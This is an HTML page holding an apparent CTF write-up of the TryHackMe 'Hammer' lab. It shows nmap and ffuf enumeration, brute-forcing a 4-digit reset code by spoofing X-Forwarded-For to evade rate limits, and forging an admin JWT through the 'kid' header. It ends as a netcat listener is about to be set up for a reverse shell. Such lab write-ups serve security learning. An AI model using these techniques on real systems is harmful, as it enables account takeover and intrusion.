<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/CTF-Blogs/js/bundle.min.5991d603939a6d188be342b278a4555db90f163903158c623d2c39fde3d82cb3.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">A CTF Blog - Hammer</title>
<meta property="og:title" content=A&#32;CTF&#32;Blog&#32;-&#32;Hammer />
<meta name="twitter:title" content=A&#32;CTF&#32;Blog&#32;-&#32;Hammer />
<meta itemprop="name" content=A&#32;CTF&#32;Blog&#32;-&#32;Hammer />
<meta name="application-name" content=A&#32;CTF&#32;Blog&#32;-&#32;Hammer />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="https://phantomindamachine.github.io/CTF-Blogs/try-hack-me/medium/hammer/" />
<link rel="canonical" href="https://phantomindamachine.github.io/CTF-Blogs/try-hack-me/medium/hammer/" itemprop="url" />
<meta name="url" content="https://phantomindamachine.github.io/CTF-Blogs/try-hack-me/medium/hammer/" />
<meta name="twitter:url" content="https://phantomindamachine.github.io/CTF-Blogs/try-hack-me/medium/hammer/" />
<meta property="og:url" content="https://phantomindamachine.github.io/CTF-Blogs/try-hack-me/medium/hammer/" />


<meta property="og:updated_time" content="2025-03-03T16:52:42-05:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://phantomindamachine.github.io/CTF-Blogs/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.145.0">


    
    

<link type="text/css" rel="stylesheet" href="/CTF-Blogs/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
        
            <a href="https://phantomindamachine.github.io/CTF-Blogs/">
                <h1>A CTF Blog</h1>
            </a>
        
    </h1>
    <p class="lead">
    Blogging about CTFs
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
            
            
                
                
            
                
                
                        
                
            
        
        
            

            
                
                
            
            
                
                
            
                
                
                        
                
            
        
        
            

            
                
                
            
            
                
                
            
                
                
                        
                            <li class="heading">
                                <a href="https://phantomindamachine.github.io/CTF-Blogs/try-hack-me/">Try Hack Me</a>
                            </li>
                            
                            <li class="sub-heading">
                                
                            </li>
                            
                                <li class="bullet">
                                    <a href="https://phantomindamachine.github.io/CTF-Blogs/"></a>
                                </li>
                            
                        
                    
                
            
        

    </ul>
</nav>

        




















        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://phantomindamachine.github.io/CTF-Blogs/try-hack-me/medium/hammer/">Hammer</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2025-03-03T16:52:42-0500" class="post-date">
        March 3, 2025
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>8 mins read</span>
      </span>
    </div>

    
  </div>

  
  

  
</div>

  <hr>
<h1 id="tryhackme-hammer-ctf-challenge">TryHackMe: Hammer CTF Challenge</h1>
<p><em><strong>Acknowledgment</strong></em>: Shout out to <code>hexguy</code> whom writeup helped me solve this box. His writeup seems to be down when last I checked.</p>
<h2 id="add-target-ip-to-etchosts-file">Add target IP to <code>/etc/hosts</code> file</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo vim /etc/hosts
</span></span></code></pre></div><p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer.png" alt="Image"></p>
<hr>
<h2 id="1-reconnaissance">1. Reconnaissance</h2>
<p>It says the first flag is behind a dashboard login.
Navigating to <code>http://hammer.thm/</code> shows an <code>ERR_CONNECTION_REFUSED</code>.
Maybe we have the wrong port.
Lets start with <code>nmap</code>.</p>
<hr>
<p><em><strong>Note</strong></em>: As a friendly reminder, <code>-sV</code> excludes port 9100, which is often the default port for printers.</p>
<ul>
<li><strong>Don&rsquo;t use the <code>â€“-allports</code> flag unless you want to risk printing a lot of pages on a printer</strong>.</li>
<li>Imagine staying undetected by any Intrution Detection System (IDS) or Intrusion Prevention System (IPS), just to get caught by a printer spitting out pages of nmap scans.</li>
<li>Yes, that&rsquo;s a thing. Google it! Use <code>--exclude</code> where necessary.</li>
</ul>
<hr>
<p><em><strong>Note</strong></em>: <strong>Saving the outputs to disk will help you in the long run</strong>.</p>
<ul>
<li>Reconnaissance can take multiple sessions</li>
<li>it would be a shame to lose an <code>nmap</code> result that was running for quite a while.</li>
</ul>
<hr>
<h3 id="start-off-simple">Start off simple:</h3>
<ul>
<li><code>--top-ports 20</code> only scans the top 20 most common ports</li>
<li><code>-o</code> outputs the standard out to a file</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --top-ports <span style="color:#ae81ff">20</span> hammer.thm -o nMap/hammer_top20_ports.txt
</span></span></code></pre></div><p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-1.png" alt="Image"></p>
<p>Port 22 is open but no web-server.</p>
<h3 id="scan-a-larger-range">Scan a larger range.</h3>
<ul>
<li><code>-sV</code> to scan for version</li>
<li><code>-O</code> for OS detection</li>
<li><code>-p 0-2000</code> to scan ports 0 through 2000</li>
<li><code>-oN</code> to output scan in normal</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV -O -p 0-2000 hammer.thm -oN nMap/hammer_p0-2000_sV_O.txt
</span></span></code></pre></div><p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-2.png" alt="Image"></p>
<p>Now we get an Apache server running on port 1337.</p>
<h3 id="rescan">Rescan</h3>
<p>Going a bit deeper on our 2 open ports</p>
<ul>
<li><code>-A</code> Enables OS and version detection, script scanning, and traceroute.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -A -p 22,1337 hammer.thm -oN nMap/hammer_A_p22_1337.txt
</span></span></code></pre></div><p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-3.png" alt="Image"></p>
<p>Here we find:</p>
<ul>
<li>PHP is running because the <code>PHPSESSID</code> cookie is set.</li>
<li>the cookie is missing the <code>HTTPOnly</code> flag, making it vulnerable to Cross-Site Scripting (XSS) attacks</li>
</ul>
<h3 id="recap-nmap-scans">Recap nmap scans</h3>
<p><strong>open ports</strong>:</p>
<ul>
<li>22 (ssh)</li>
<li>1337 (http)</li>
</ul>
<p><strong>the website</strong>:</p>
<ul>
<li>running on port 1337</li>
<li>Apache server is using PHP as the programming language</li>
<li>Apache/2.4.41 (Ubuntu)</li>
<li>Session management is in place through the <code>PHPSESSID</code> cookie</li>
<li>Apache server is exposing version, helping in finding CVEs</li>
</ul>
<p><strong>Host</strong>:</p>
<ul>
<li>Linux 4.15</li>
</ul>
<h2 id="2-the-website">2. The Website</h2>
<p><strong>Going to <code>http://hammer.thm:1337</code> we are greeted with</strong>:</p>
<ul>
<li>a very plain login page with an email and password form field</li>
<li>a reset password functionality at <code>http://hammer.thm:1337/reset_password.php</code></li>
</ul>
<p><strong>A few things to do right away to form fields without even starting up any tools</strong>:</p>
<ol>
<li>Check for SQL injection vulnerabilities (or <a href="https://xkcd.com/327/?ref=0x4d.ghost.io" target="_blank">Bobby Tables</a>)</li>
<li>Trying random emails to find indications of different responses for an unregistered vs. registered emails
<ul>
<li>Are the error messages generic, or &ldquo;<strong>This email/user does not exist&rdquo;</strong> kind of messages?</li>
</ul>
</li>
<li>Check for brute-force protections by simulating a few requests in short succession
<ul>
<li>Does it lock me out or throw CAPTCHAs at me?</li>
</ul>
</li>
<li>Check whether the http responses expose anything they should not.
<ul>
<li>Any redirect headers, hints for the target page once login is successful, etc.</li>
<li>(You wouldn&rsquo;t believe what i found in HTTP requests over time - yes i am looking at you, outlook credentials in a regular API response of a community application)</li>
</ul>
</li>
</ol>
<h3 id="brute-force-protections">Brute-Force Protections</h3>
<p>After no interesting findings in step one and two, we try step 3</p>
<ul>
<li>I fired up a bash script to attempt to login 100 times in a row with random creds</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..100<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>  printf <span style="color:#e6db74">&#34;[%d] http &#34;</span> $i
</span></span><span style="display:flex;"><span>  curl -s -w <span style="color:#e6db74">&#39;%{http_code} size=%{size_download}\n&#39;</span> <span style="color:#e6db74">&#39;http://hammer.thm:1337/&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Accept-Language: en-US,en;q=0.9&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Cache-Control: max-age=0&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Connection: keep-alive&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Cookie: PHPSESSID=r808bg0f5uarqscv7t3ues268a&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;DNT: 1&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Origin: http://hammer.thm:1337&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Referer: http://hammer.thm:1337/&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests: 1&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --data-raw <span style="color:#e6db74">&#39;email=testy%40tester.com&amp;password=51353245711&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -o /dev/null <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --insecure
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><ul>
<li>shell script adds response sizes to the output to check for deviations.</li>
<li>failed logins attempts return <code>http 200</code></li>
<li>No change in the http code or size</li>
</ul>
<p>Now, to try same thing on <code>.../reset_password.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..100<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>  printf <span style="color:#e6db74">&#34;[%d] http &#34;</span> $i
</span></span><span style="display:flex;"><span>  curl -s -w <span style="color:#e6db74">&#39;%{http_code} size=%{size_download}\n&#39;</span> <span style="color:#e6db74">&#39;http://hammer.thm:1337/reset_password.php&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Accept-Language: en-US,en;q=0.9&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Cache-Control: max-age=0&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Connection: keep-alive&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Cookie: PHPSESSID=7acl7dfp6h1hpm2pln53qg4oqn&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;DNT: 1&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Origin: http://hammer.thm:1337&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Referer: http://hammer.thm:1337/reset_password.php&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests: 1&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --data-raw <span style="color:#e6db74">&#39;email=testy%40tester.com&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -o /dev/null <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --insecure
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><ul>
<li>here we get a sharp drop in <code>Content-Length</code> on the response</li>
<li>from 1754 bytes to 44 bytes after 10 requests</li>
</ul>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-6.png" alt="Image"></p>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-7.png" alt="Image"></p>
<ul>
<li>Adding verbose to the curl command reveals the issue.</li>
<li>we are being throttled</li>
<li>other than that nothing else interesting</li>
</ul>
<h3 id="checking-http-responses">Checking HTTP Responses</h3>
<p>Checking the website source code, we find a Dev Note:
<img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-8.png" alt="Image"></p>
<ul>
<li>keeping this in the back of mind for now</li>
</ul>
<p>Time to enumerate the website
For this we be using <code>ffuf</code></p>
<ul>
<li><code>-u</code> - path to target</li>
<li><code>FUZZ</code> - placed where we want to fuzz</li>
<li><code>-w</code> - path to wordlist</li>
<li><code>-e</code> - to add an extension (we know the website is running PHP)</li>
<li><code>-c</code> - for colorize output</li>
<li><code>-ic</code> - ignore wordlist comments</li>
<li><code>-t 400</code> - number of concurrent threads</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://hammer.thm:1337/FUZZ -w /usr/.../directory-list-2.3-medium.txt -e .php -c -ic -t <span style="color:#ae81ff">400</span>
</span></span></code></pre></div><p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-9.png" alt="Image"></p>
<p>And now to try scanning <code>hmr_&lt;DIRECTORY_NAME&gt;</code> that was found in the source code</p>
<ul>
<li>simply prepend <code>hmr_</code> to the <code>FUZZ</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://hammer.thm:1337/hmr_FUZZ -w /usr/.../directory-list-2.3-medium.txt -e .php -c -ic -t <span style="color:#ae81ff">400</span>
</span></span></code></pre></div><p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-10.png" alt="Image"></p>
<p>Looking through the <code>/hmr_logs</code> reveals a user</p>
<ul>
<li><code>tester@hammer.thm</code></li>
</ul>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-11.png" alt="Image"></p>
<p>Trying the user name on <code>/reset_password.php</code> to check if responses have changed</p>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-12.png" alt="Image"></p>
<ul>
<li>we get a prompt to enter a recovery code</li>
<li>4-Digit Code</li>
<li>timer expires after 3 mins</li>
</ul>
<p>Using Burp Suite to intercept the request</p>
<ul>
<li>
<p>type 4-digit code</p>
</li>
<li>
<p><strong>intercept</strong> request and send to <strong>repeater</strong>
<img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-14.png" alt="Image"></p>
<ul>
<li>the timeout is handled via JavaScript</li>
<li>the timeout can be modified by sending a different value for <code>s</code></li>
<li>rate-limited and shuts down after 10 attempts</li>
</ul>
</li>
</ul>
<p>We now have something to attack.
We need to figure out how to get pass the rate-limit.</p>
<h2 id="3-bypassing-multi-factor-authentication--rate-limit-countermeasures">3. Bypassing Multi-Factor Authentication &amp; Rate-Limit Countermeasures</h2>
<p>We do not know how rate-limiting is being applied.
Rate-Limiting works either one one, or combination of the following:</p>
<ol>
<li>IP-Address</li>
<li>Session id</li>
<li>User or account</li>
<li>certain headers or cookies</li>
<li>endpoints/paths</li>
</ol>
<p>The winner this time was IP-related headers</p>
<ul>
<li>Akamai and CloudFlare use <code>True-Client-IP</code></li>
<li>Amazon CloudFront, AWS Elastic Load Balancing and F5 Load Balancers use <code>X-Forwarded-For</code>
<ul>
<li>You can have multiple layers between the user and the origin</li>
<li><code>X-Forwarded-For</code> can actually have multiple comma-separated values#</li>
</ul>
</li>
</ul>
<p>Trying <code>X-Forwarded-For: 1.1.1.1</code> reset the rate-limit.</p>
<ul>
<li>Changing the IP-Address in the Header gives another 10 request before it kicks in again.</li>
<li>In fact, any value, even an improperly formatted IPV4 address also worked.
<img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-15.png" alt="Image"></li>
</ul>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-17.png" alt="Image"></p>
<h4 id="brute-forcing-the-mfa">Brute-Forcing the MFA</h4>
<p>So far, the steps are as follows:</p>
<ol>
<li>start the reset password process using <code>tester@hammer.thm</code></li>
<li>the user&rsquo;s <code>PHPSESSID</code> is active for adding the 4-digit code for 180 seconds</li>
<li>brute-force by running from 0000 to 9999 in steps of 1</li>
<li>doing step 3 while changing the <code>X-Forwarded-For</code> either every 10 attempts, or simply every attempt</li>
</ol>
<h4 id="fuzz-the-recovery-code">FUZZ The Recovery Code</h4>
<p>Generate a file that has values from 0000 to 9999:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>seq -w <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">9999</span> &gt;&gt; codes.txt
</span></span></code></pre></div><ul>
<li>making sure to use <code>-w</code> flag, or else you will not create 4-digit numbers</li>
</ul>
<p>Now to fire up <code>FFuF</code> and use <code>codes.txt</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://hammer.thm:1337/reset_password.php -w codes.txt -X <span style="color:#e6db74">&#34;POST&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -H <span style="color:#e6db74">&#34;X-Forwarded-For: FUZZ&#34;</span> -H <span style="color:#e6db74">&#34;Cookie: PHPSESSID=&lt;CHANGE_ME&gt;&#34;</span> -d <span style="color:#e6db74">&#34;recovery_code=FUZZ&#34;</span> -fr <span style="color:#e6db74">&#34;Invalid&#34;</span>
</span></span></code></pre></div><ul>
<li>
<p><code>-fr</code> - filters using regexp.</p>
<ul>
<li>the failed responses include <code>Invalid or expired recovery code!</code></li>
</ul>
</li>
<li>
<p><code>-d</code> - POST data, in this case the field we want to <code>FUZZ</code></p>
</li>
<li>
<p>Replace <code>&lt;CHANGE_ME&gt;</code> with the current <code>PHPSESSID</code></p>
</li>
</ul>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-18.png" alt="Image"></p>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-20.png" alt="Image"></p>
<ul>
<li>Notice no MFA Token.</li>
<li>Guessing the payload structure would have also bypassed the 4-digit MFA code</li>
</ul>
<p>Logging in gives us our first flag.</p>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-21.png" alt="Image"></p>
<p>The site is logging us out every 20 seconds.</p>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-22.png" alt="Image"></p>
<ul>
<li>Changing the expiration date to something further in the future will prevent this
<img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-24.png" alt="Image"></li>
</ul>
<h3 id="remote-code-execution">Remote Code Execution</h3>
<p>In the dashboard we see some sort of system command form field.
<img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-23.png" alt="Image"></p>
<ul>
<li>most Linux commands are blocked</li>
<li>we are logged in with the <code>user</code> role</li>
</ul>
<p>Most of the files were found earlier while fuzzing directories.</p>
<ul>
<li><code>188ade1.key</code> looks interesting</li>
</ul>
<p>Lets download it using <code>wget</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://hammer.thm:1337/188ade1.key
</span></span></code></pre></div><p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer%201.png" alt="Image"></p>
<ul>
<li>not much info there</li>
</ul>
<p>Looking at the http request and response, we notice that we are sending a JWT token in the <code>Authorization</code> header.</p>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-20%201.png" alt="Image"></p>
<p>Lets copy that and head over to <code>jwt.io</code> to get a closer look.</p>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-21%201.png" alt="Image"></p>
<p>From the image above we can notice a few things:</p>
<ul>
<li>the JWT token is signed with the <code>HS256</code> algorithm
<ul>
<li>it referencing a key located at <code>/var/www/mykey.key</code></li>
</ul>
</li>
<li>the token has the <code>role</code> set to <code>user</code></li>
</ul>
<h4 id="jwt-kid-vulnerability">JWT <code>kid</code> Vulnerability</h4>
<p>Lets start by changing the JWT <code>kid</code> to something that does not exist.</p>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-22%201.png" alt="Image"></p>
<ul>
<li>we get a <code>Invalid token: Key file not found</code> error.</li>
</ul>
<p>This means:</p>
<ul>
<li><code>/var/www/mykey.key</code> exists</li>
<li>the backend is verifying its existence</li>
</ul>
<p>How can we use this information:</p>
<ul>
<li>we can have <code>kid</code> point to a file we control
<ul>
<li>control meaning, we can see the content and use it</li>
</ul>
</li>
<li>we then use the file to create a symmetric passphrase for the signature</li>
</ul>
<hr>
<p><em><strong>Note</strong></em>: The correct thing would have been to have the key identifier that the backend could look up in an internal database and not point to a file</p>
<hr>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-23%201.png" alt="Image"></p>
<ul>
<li>we pointed the JWT <code>kid</code> to the file <code>/var/www/html/188ade1.key</code></li>
<li>we changed our role from <code>user</code> to <code>admin</code></li>
<li>we used the contents of <code>188ade1.key</code> to sign our JWT token</li>
</ul>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-24%201.png" alt="Image"></p>
<p>With that we can now run Linux commands</p>
<h3 id="getting-a-shell">Getting a Shell</h3>
<p>For this we will use the website <em><strong>revshells.com</strong></em> to help craft a payload:</p>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-30.png" alt="Image"></p>
<p>Lets set up our listener with <code>netcat</code></p>
